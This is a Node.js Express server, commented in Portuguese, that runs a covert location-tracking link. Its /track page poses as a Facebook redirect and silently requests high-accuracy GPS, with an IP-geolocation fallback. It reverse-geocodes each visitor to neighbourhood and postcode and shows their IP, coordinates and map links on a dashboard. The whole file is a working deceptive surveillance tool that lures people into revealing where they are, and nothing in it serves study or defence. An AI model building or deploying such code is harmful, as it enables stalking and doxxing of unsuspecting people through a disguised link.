const express = require('express');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());

const clicks = [];

// Função auxiliar para fazer requisições HTTP/HTTPS
function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    lib.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard de Rastreamento</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 15px; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 8px 15px;
          border-radius: 5px;
          display: block;
          margin-top: 10px;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 1em;
          margin-bottom: 20px;
        }
        .btn:hover { background: #5568d3; }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #667eea;
          padding: 20px;
          margin-bottom: 15px;
          border-radius: 8px;
        }
        .click-item.has-gps {
          border-left-color: #28a745;
          background: #f0fff4;
        }
        .click-time { font-weight: bold; color: #667eea; font-size: 1.1em; margin-bottom: 10px; }
        .click-info { color: #555; margin: 8px 0; line-height: 1.6; }
        .badge {
          display: inline-block;
          padding: 4px 12px;
          border-radius: 12px;
          font-size: 0.85em;
          font-weight: bold;
          margin: 5px 5px 5px 0;
        }
        .badge-gps { background: #28a745; color: white; }
        .badge-ip { background: #ffc107; color: #333; }
        .map-link {
          color: #667eea;
          text-decoration: none;
          font-weight: bold;
        }
        .map-link:hover { text-decoration: underline; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento</h1>
          <p>Monitoramento de cliques com localização</p>
          <div class="link-box">
            <strong>🔗 Link de Rastreamento:</strong>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()" style="margin-top:10px; padding:8px 20px;">📋 Copiar Link</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS (Bairro)</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="ipClicks">0</div>
            <div class="stat-label">Só IP (Cidade)</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2>Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('✅ Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.location && c.location.bairro && c.location.bairro !== 'N/A');
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            
            const ipClicks = data.clicks.filter(c => c.ipLocation && (!c.location || !c.location.bairro || c.location.bairro === 'N/A'));
            document.getElementById('ipClicks').textContent = ipClicks.length;
            
            const container = document.getElementById('clicksList');
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique registrado ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR');
              const loc = c.location || c.ipLocation;
              const hasGPS = c.location && c.location.coordenadas;
              const hasBairro = loc && loc.bairro && loc.bairro !== 'N/A';
              
              let locationHTML = '';
              if (loc) {
                const badge = hasGPS ? '<span class="badge badge-gps">📍 GPS</span>' : '<span class="badge badge-ip">🌐 IP</span>';
                locationHTML = \`
                  \${badge}
                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade || 'Não identificada'}</div>
                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado || 'Não identificado'}</div>
                  \${hasBairro ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>\` : ''}
                  \${loc.pais ? \`<div class="click-info">🌎 <strong>País:</strong> \${loc.pais}</div>\` : ''}
                  \${loc.coordenadas ? \`
                    <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.coordenadas}</div>
                    <div class="click-info"><a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" class="map-link">🔗 Ver no Google Maps</a></div>
                  \` : ''}
                \`;
              } else {
                locationHTML = '<div class="click-info" style="color:#ff6b6b;">❌ Localização não disponível</div>';
              }
              
              return \`
                <div class="click-item \${hasGPS ? 'has-gps' : ''}">
                  <div class="click-time">⏰ \${date}</div>
                  <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
                  \${locationHTML}
                </div>
              \`;
            }).join('');
          } catch (error) {
            console.error('Erro ao carregar:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento - SILENCIOSA
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    location: null,
    ipLocation: null
  };
  
  clicks.push(clickData);
  console.log('✅ Clique ID:', clickData.id);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecionando para Facebook...</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: #1877f2;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
          text-align: center;
          color: white;
        }
        .logo {
          font-size: 4em;
          margin-bottom: 20px;
        }
        h2 { 
          font-weight: 400;
          margin-bottom: 10px;
        }
        .loader {
          border: 4px solid rgba(255,255,255,0.3);
          border-top: 4px solid white;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">f</div>
        <h2>Redirecionando para o Facebook...</h2>
        <div class="loader"></div>
      </div>
      
      <script>
        const clickId = ${clickData.id};
        let hasLocation = false;
        let redirectTimer = null;
        
        // Função para redirecionar
        function doRedirect() {
          if (!redirectTimer) {
            redirectTimer = setTimeout(() => {
              window.location.href = 'https://www.facebook.com/';
            }, 500);
          }
        }
        
        // Tenta capturar GPS silenciosamente
        if (navigator.geolocation) {
          // Define timeout de 8 segundos para GPS
          const gpsTimeout = setTimeout(() => {
            if (!hasLocation) {
              console.log('GPS timeout - buscando por IP');
              // Busca localização por IP
              fetch('/api/get-location-ip', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ clickId: clickId })
              }).then(() => {
                doRedirect();
              }).catch(() => {
                doRedirect();
              });
            }
          }, 8000);
          
          // Tenta obter GPS
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              hasLocation = true;
              clearTimeout(gpsTimeout);
              
              console.log('GPS obtido');
              
              try {
                await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    clickId: clickId,
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                  })
                });
              } catch (e) {
                console.error('Erro ao salvar GPS:', e);
              }
              
              doRedirect();
            },
            async (error) => {
              hasLocation = true;
              clearTimeout(gpsTimeout);
              
              console.log('GPS negado ou indisponível');
              
              // Busca localização por IP
              try {
                await fetch('/api/get-location-ip', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({ clickId: clickId })
                });
              } catch (e) {}
              
              doRedirect();
            },
            { 
              enableHighAccuracy: true,
              timeout: 7000,
              maximumAge: 0
            }
          );
        } else {
          // Navegador não suporta GPS - busca por IP
          fetch('/api/get-location-ip', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ clickId: clickId })
          }).then(() => {
            doRedirect();
          }).catch(() => {
            doRedirect();
          });
        }
      </script>
    </body>
    </html>
  `);
});

// Buscar localização por IP (endpoint separado)
app.post('/api/get-location-ip', async (req, res) => {
  try {
    const { clickId } = req.body;
    const click = clicks.find(c => c.id === clickId);
    
    if (!click) {
      return res.json({ success: false });
    }
    
    console.log('  → Buscando localização por IP para click', clickId);
    
    const ipClean = click.ip.replace('::ffff:', '').replace('::1', '').trim();
    let finalIP = ipClean;
    
    // Detecta IP local
    if (ipClean === '127.0.0.1' || ipClean === '' || ipClean.startsWith('192.168') || ipClean.startsWith('10.')) {
      try {
        const ipData = await fetchJSON('https://api.ipify.org?format=json');
        finalIP = ipData.ip;
        console.log('  → IP público:', finalIP);
      } catch (e) {
        console.log('  ⚠ Erro ao obter IP público');
      }
    }
    
    // Busca localização
    try {
      const ipData = await fetchJSON(`http://ip-api.com/json/${finalIP}?lang=pt&fields=status,country,regionName,city,district,lat,lon,zip`);
      
      if (ipData.status === 'success') {
        click.ipLocation = {
          cidade: ipData.city || 'Não identificada',
          estado: ipData.regionName || 'Não identificado',
          bairro: ipData.district || 'N/A',
          pais: ipData.country || 'Brasil',
          cep: ipData.zip || 'N/A',
          coordenadas: ipData.lat && ipData.lon ? `${ipData.lat}, ${ipData.lon}` : null
        };
        console.log('  ✓ Localização IP:', ipData.city, '-', ipData.regionName);
      }
    } catch (error) {
      console.log('  ✗ Erro ao buscar localização por IP:', error.message);
    }
    
    res.json({ success: true });
  } catch (error) {
    res.json({ success: false });
  }
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    console.log('  ✓ GPS:', lat, lng, '(±', accuracy, 'm)');
    
    // Busca endereço via Nominatim
    try {
      const data = await fetchJSON(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`
      );
      
      if (data && data.address) {
        const addr = data.address;
        
        click.location = {
          cidade: addr.city || addr.town || addr.village || addr.municipality || 'Não identificada',
          estado: addr.state || 'Não identificado',
          bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A',
          pais: addr.country || 'Brasil',
          cep: addr.postcode || 'N/A',
          coordenadas: `${lat}, ${lng}`
        };
        
        console.log('  ✅ Endereço GPS:', click.location.cidade, '-', click.location.estado, '/', click.location.bairro);
      }
    } catch (error) {
      console.error('  ✗ Erro Nominatim:', error.message);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro:', error);
    res.json({ success: false });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.slice().reverse()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    uptime: process.uptime(),
    clicks: clicks.length
  });
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('========================================');
  console.log('✅ SERVIDOR ONLINE');
  console.log('========================================');
  console.log('Porta:', PORT);
  console.log('Redirect: Facebook');
  console.log('Modo: Silencioso');
  console.log('========================================');
  console.log('');
});
